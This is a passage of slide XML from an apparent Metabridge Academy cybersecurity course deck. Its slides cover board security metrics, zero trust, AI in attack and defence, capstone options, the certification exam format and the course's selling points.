                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"We have 47 CVEs with              "Our current vulnerability profile is</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CVSS &gt; 7.0 on production.         similar to Equifax before their 2017</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Our patching cadence is           breach, which cost $575M. We face</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>68 days average. We need          regulatory action from CBN and NDPA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WAF deployment and SOC            2023 compliance risk. Investing ₦120M</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>tier 2 capability."               in 5 specific controls reduces our risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>exposure by 65% — a 13× ROI if we</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>avoid a comparable incident."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECURITY METRICS THAT MATTER TO BOARDS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Mean Time to Detect (MTTD) — how long before we notice an attack?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Mean Time to Respond (MTTR) — how long to contain it?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Phishing click rate — what % of employees fail simulated phishing?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Patch compliance % — what % of critical patches applied within SLA?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Third-party risk coverage — what % of vendors assessed?</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THE FUTURE: ZERO TRUST</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ZERO TRUST ARCHITECTURE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE OLD MODEL:                    ZERO TRUST:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Trust but verify"                "Never trust, always verify"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Internal network = safe           EVERYTHING is untrusted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>External network = dangerous      Every request must prove itself</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>If attacker breaches perimeter:   Even if attacker is inside:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Free access to everything       → Still blocked by zero trust</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ZERO TRUST PILLARS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Identity      → Verify WHO you are (MFA mandatory)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Device        → Verify WHAT device you're on (MDM, compliance check)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Network       → Micro-segmentation — no lateral movement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Application   → Verify access to each app individually</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Data          → Data-level encryption, classification, DLP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IMPLEMENTATION (not a product — it's an architecture):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Start with: MFA everywhere → Least privilege IAM → Microsegmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ It's a journey, not a checkbox. Budget 2–3 years for full implementation.</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AI IN CYBERSECURITY</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AI — BOTH SIDES OF THE BATTLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ATTACKERS USING AI:                 DEFENDERS USING AI:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────────────               ────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AI-generated phishing at scale      UEBA: Detect unusual behaviour</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(personalised for millions)         patterns vs AI baseline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Deepfake audio/video CEO            AI SIEM: Correlate and prioritise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>voice clone for vishing             thousands of alerts, reduce noise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Automated vulnerability             Automated response: Contain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>research and exploitation           threats without human delay</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AI-powered password cracking        Code analysis: Find security bugs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Adaptive malware that evades AV     before deployment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE ARMS RACE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AI makes attacks cheaper and more personalised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AI makes defences faster and more adaptive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Humans are still needed for judgement, ethics, and novel situations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The professional who can work WITH AI tools is the most valuable.</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CAPSTONE OPTIONS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CAPSTONE PROJECT — CHOOSE YOUR PATH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>A. PENETRATION TEST REPORT        B. SOC SIMULATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Full pentest on lab environment   Set up mini-SOC with SIEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PTES methodology                  15+ detection rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Professional report delivery      Analyse 50 provided alerts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(Most technical)                  3 full incident reports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>C. MALWARE ANALYSIS REPORT        D. SECURITY AWARENESS PROGRAMME</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Static + dynamic analysis         Design for a real Nigerian org</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MITRE ATT&amp;CK mapping              3 training modules + phishing sim</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IOC extraction + YARA rule        Pilot it. Present feedback.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Threat intelligence report        (Great for career changers)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>E. CYBERSECURITY STRATEGY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Complete strategy for Nigerian SME</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Risk assessment + NIST CSF roadmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5 security policies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Board presentation (10 slides max)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ALL CAPSTONES: Required for certification | Blockchain-verified</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CERTIFICATION EXAM</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CERTIFICATION EXAM — METABRIDGE CYBERSECURITY PROFESSIONAL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECTION A: Multiple Choice          40 questions    40 marks   90 min</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>All 12 modules represented</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECTION B: Short Answer             4 of 6 questions 20 marks  60 min</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Explain, describe, demonstrate understanding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECTION C: Case Studies             2 cases          25 marks  60 min</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Case 1: Nigerian bank breach (incident response)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Case 2: Lagos trading company BEC attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECTION D: Essay (choose 1)         1 essay          15 marks  30 min</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Option 1: Nigerian cybersecurity challenges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Option 2: Zero Trust implementation roadmap</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PASS: 75%    DISTINCTION: 85%+</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4 hours total | Proctored online</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Blockchain-verified certificate for all who pass</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THE METABRIDGE CYBERSECURITY DIFFERENCE</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WHY METABRIDGE CYBERSECURITY?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>GENERIC ONLINE COURSE         METABRIDGE ACADEMY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>────────────────              ──────────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Global examples               Nigerian context throughout (CBN, NDPA, NIBSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Video-only labs               Live hands-on labs (Kali, Burp, ANY.RUN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PDF certificate               Blockchain-verified credential</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>No legal context              Cybercrimes Act 2015 integrated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Theoretical datasets          Real Nigerian attack patterns</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>No local threat intel         SIM swap, BEC, smishing — all covered</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Email support only            WhatsApp mentor access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>REFERENCE TEXTBOOK INTEGRATION:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cybersecurity Sefer — metabridgeacademy.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The theoretical foundation beneath every module.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
